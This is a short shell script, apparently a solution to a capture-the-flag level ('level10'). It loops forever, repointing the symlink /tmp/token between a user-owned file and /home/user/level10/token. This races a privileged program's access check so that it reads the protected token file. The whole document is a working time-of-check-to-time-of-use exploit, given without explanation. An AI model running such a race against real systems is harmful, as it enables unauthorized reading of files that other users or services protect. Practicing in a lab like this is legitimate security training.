#!/bin/sh

while true
    do
        echo "MY LINK"
        ln -sf /tmp/myfile /tmp/token
        echo "TOKEN LINK"
        ln -sf /home/user/level10/token /tmp/token
    done

